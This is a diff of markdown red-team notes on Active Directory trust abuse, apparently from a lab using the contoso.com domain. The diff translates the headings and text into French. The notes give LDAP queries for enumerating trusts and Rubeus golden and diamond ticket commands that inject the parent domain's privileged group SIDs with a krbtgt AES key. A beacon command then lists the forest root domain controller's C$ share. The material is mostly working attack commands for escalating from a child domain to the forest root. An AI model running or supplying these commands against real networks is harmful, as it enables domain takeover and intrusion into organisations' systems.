@@ -3,21 +3,21 @@
 * Inter-Realm Tickets
 * Parent-Child Trusts
 * Inbound Trusts
-* Outbound Trusts
+* ### Outbound Trusts
 
-Enumeration Trusted Domain Objects
+### Énumérer les Trusted Domain Objects
 
 ```
 ldapsearch (objectClass=trustedDomain)
 ```
 
-Enumerate Trust accounts
+### Énumérer les comptes de trust
 
 ```
 ldapsearch (samAccountType=805306370) --attributes samAccountName
 ```
 
-Discover Parent/Child Trusts
+### Identifier les Parent-Child Trusts
 
 ```
 ldapsearch (objectClass=trustedDomain)
@@ -27,23 +27,23 @@ ldapsearch (objectClass=trustedDomain)
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /nowrap
 ```  
 
-Parent Domain SID lookup
+### Récupérer le SID du domaine parent
 
 ```
 ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
 ```  
 
-Parent domain can be added to the ticket.
+Le SID du domaine parent peut être ajouté au ticket.
 
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
 ```  
 
-Once the ticket is injected into a logon session, it can be used to access the forest root domain controller.
+Une fois le ticket injecté dans la session de logon, il peut servir à accéder au Domain Controller racine de la forest.
 
 beacon> ls \\lon-dc-1\c$
 
-Outbound Trusts
+### Outbound Trusts
 
 ```
 getuid
